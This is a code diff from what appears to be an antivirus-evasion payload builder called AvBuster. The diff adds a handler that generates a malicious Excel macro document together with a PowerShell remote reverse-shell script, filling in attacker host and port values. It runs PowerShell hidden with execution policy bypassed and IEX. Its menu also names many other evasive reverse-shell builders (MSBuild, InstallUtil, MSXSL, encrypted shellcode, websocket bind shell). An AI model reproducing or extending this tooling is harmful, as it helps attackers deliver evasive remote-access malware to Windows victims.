@@ -747,51 +747,157 @@ func (currentuservals *UserValues) processencryptedcustomshellcode(req *http.Req
 
 	os.Remove(outpath)
 }
-
 func avbusterhomepage(httpw http.ResponseWriter, req *http.Request) {
-	if req.Method == "GET" {
-		err := avbustertemplate.Execute(httpw, nil)
-		if err != nil {
-			fmt.Println(err)
-		}
-	} else {
-		err := req.ParseForm()
-		checkerror(err)
-		choice := req.Form.Get("selectedshelltype")
-		currentuservals := UserValues{}
-		if choice == "psrevshell" {
-			currentuservals.processpsrevshellbuild(req)
-		} else if choice == "msbuildrevshell" {
-			currentuservals.processmsbuildrevshell(req)
-		} else if choice == "hybridencrypted" {
-			currentuservals.processhybridencrypt(req)
-		} else if choice == "selfsigned" {
-			currentuservals.processselfsignedrevshell(req)
-		} else if choice == "customgo" {
-			currentuservals.processcustomgo(req)
-		} else if choice == "httprevshell" {
-			currentuservals.processhttprevshell(req)
-		} else if choice == "pscsharprevshell" {
-			currentuservals.processpscsharp(req)
-		} else if choice == "installutilrevshell" {
-			currentuservals.processinstallutilrevshell(req)
-		} else if choice == "msxmlxslttcprevshell" {
-			currentuservals.processmsxsltrevshell(req)
-		} else if choice == "customdotnetrev" {
-			currentuservals.processcustomdotnet(req)
-		} else if choice == "encshellcode" {
-			currentuservals.processencryptedcustomshellcode(req)
-		} else if choice == "pinnedcert" {
-			currentuservals.processpinnedcertrevshell(req)
-		} else if choice == "normaltcprev" {
-			currentuservals.processnormalrevtcp(req)
-		} else if choice == "websocketbindshell" {
-			currentuservals.processwebsocketbindshell(req)
-		}
-		err = avbustertemplate.Execute(httpw, nil)
-		checkerror(err)
+	err := avbustertemplate.Execute(httpw, nil)
+	if err != nil {
+		fmt.Println(err)
 	}
 }
+
+func avbusterprocessreq(httpw http.ResponseWriter, req *http.Request) {
+
+	err := req.ParseForm()
+	checkerror(err)
+	choice := req.Form.Get("selectedshelltype")
+	currentuservals := UserValues{}
+	if choice == "psrevshell" {
+		currentuservals.processpsrevshellbuild(req)
+	} else if choice == "msbuildrevshell" {
+		currentuservals.processmsbuildrevshell(req)
+	} else if choice == "hybridencrypted" {
+		currentuservals.processhybridencrypt(req)
+	} else if choice == "selfsigned" {
+		currentuservals.processselfsignedrevshell(req)
+	} else if choice == "customgo" {
+		currentuservals.processcustomgo(req)
+	} else if choice == "httprevshell" {
+		currentuservals.processhttprevshell(req)
+	} else if choice == "pscsharprevshell" {
+		currentuservals.processpscsharp(req)
+	} else if choice == "installutilrevshell" {
+		currentuservals.processinstallutilrevshell(req)
+	} else if choice == "msxmlxslttcprevshell" {
+		currentuservals.processmsxsltrevshell(req)
+	} else if choice == "customdotnetrev" {
+		currentuservals.processcustomdotnet(req)
+	} else if choice == "encshellcode" {
+		currentuservals.processencryptedcustomshellcode(req)
+	} else if choice == "pinnedcert" {
+		currentuservals.processpinnedcertrevshell(req)
+	} else if choice == "normaltcprev" {
+		currentuservals.processnormalrevtcp(req)
+	} else if choice == "websocketbindshell" {
+		currentuservals.processwebsocketbindshell(req)
+	} else if choice == "msexcelmacrops" {
+		currentuservals.processexcelmacro(req)
+	}
+	err = avbustertemplate.Execute(httpw, nil)
+	checkerror(err)
+
+}
+
+func (currentuservals *UserValues) processexcelmacro(req *http.Request) {
+	saveas := req.Form.Get("saveas")
+	if strings.TrimSpace(saveas) == "" {
+		saveas = "noname"
+	}
+
+	lport := req.Form.Get("lport")
+	rport := req.Form.Get("rport")
+	rhost := req.Form.Get("rhostserver")
+	lhost := req.Form.Get("lhost")
+	//currentuservals := UserValues{}
+	currentuservals.lport = lport
+	currentuservals.rport = rport
+	currentuservals.rhost = rhost
+	currentuservals.lhost = lhost
+	currentuservals.targetos = "windows"
+	currentuservals.targetarchitecture = "386"
+	currentuservals.saveas = saveas
+
+	outpath = "download" + string(os.PathSeparator) + saveas + ".ps1"
+	outpath2 := "download" + string(os.PathSeparator) + "getit.ps1"
+
+	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterExcelMacro)
+	currentuservals.createpsexelmacro(outpath)
+	currentuservals.binarytemplate = decodeanddecompress(binarytemplates.AvBusterPowerShellRemoteRevShell)
+	currentuservals.createpsrevshelltoserve(outpath2)
+	os.Remove(outpath)
+}
+func os64check() bool {
+
+	for _, e := range os.Environ() {
+		pair := strings.Split(e, "=")
+
+		if pair[0] == "PROCESSOR_ARCHITEW6432" || strings.Contains(pair[1], "64") {
+			//fmt.Println(pair[0] + "=" + pair[1])
+			return true
+		}
+	}
+	return false
+}
+func (currentuservals *UserValues) createpsrevshelltoserve(outpath string) {
+	var setpath string
+
+	fmt.Println(currentuservals.saveas)
+
+	//fmt.Println(curpath)
+	rhostreplaced := strings.Replace(currentuservals.binarytemplate, "RHOST", currentuservals.lhost, -1)
+	rportreplaced := strings.Replace(rhostreplaced, "RPORT", currentuservals.lport, 1)
+	//lportreplaced := strings.Replace(rportreplaced, "LPORT", currentuservals.lport, 1)
+	setpath = outpath
+	newFile, err := os.Create(setpath)
+	checkerror(err)
+	newFile.WriteString(rportreplaced)
+	newFile.Close()
+}
+
+func (currentuservals *UserValues) createpsexelmacro(outpath string) {
+	var setpath string
+
+	fmt.Println(currentuservals.saveas)
+
+	curpath, _ := filepath.Abs(outpath)
+	//fmt.Println(curpath)
+	correctedDIR := strings.Replace(currentuservals.binarytemplate, "CHANGEDIR", filepath.Dir(curpath), -1)
+	correctedname := strings.Replace(correctedDIR, "CHANGENAME", currentuservals.saveas, -1)
+	rportreplaced := strings.Replace(correctedname, "RHOST", currentuservals.rhost, 1)
+	setpath = outpath
+	newFile, err := os.Create(setpath)
+	checkerror(err)
+	newFile.WriteString(rportreplaced)
+	newFile.Close()
+
+	finflag := make(chan string)
+	go generateExcelwithMacro(curpath, finflag)
+	<-finflag
+
+}
+
+func generateExcelwithMacro(curpath string, finflag chan string) {
+	var cmdname string
+	if os64check() {
+		cmdname = "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe"
+
+	} else {
+
+		cmdname = "PowerShell"
+	}
+
+	cmdArgs := []string{"-w", "hidden", "-ep", "bypass", "-nop", "-c", "IEX " + "(" + curpath + ")"}
+	cmd := exec.Command(cmdname, cmdArgs...)
+	//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	err := cmd.Run()
+	checkerr(err)
+	finflag <- "Done with Excel Macro"
+}
+func checkerr(err error) {
+	if err != nil {
+		fmt.Printf("Oh something was wrong %s", err)
+		return
+	}
+}
+
 func (currentuservals *UserValues) processwebsocketbindshell(req *http.Request) {
 	saveas := req.Form.Get("saveas")
 	if strings.TrimSpace(saveas) == "" {
@@ -1267,7 +1373,8 @@ func (currentuservals *UserValues) processpsrevshellbuild(req *http.Request) {
 
 func startserver() {
 	router := mux.NewRouter()
-	router.HandleFunc("/", avbusterhomepage)
+	router.HandleFunc("/", avbusterhomepage).Methods("GET")
+	router.HandleFunc("/", avbusterprocessreq).Methods("POST")
 
 	router.PathPrefix("/static/css/").Handler(http.StripPrefix("/static/css/", http.FileServer(http.Dir("static/css/"))))
 	router.PathPrefix("/static/logo/").Handler(http.StripPrefix("/static/logo/", http.FileServer(http.Dir("static/logo/"))))
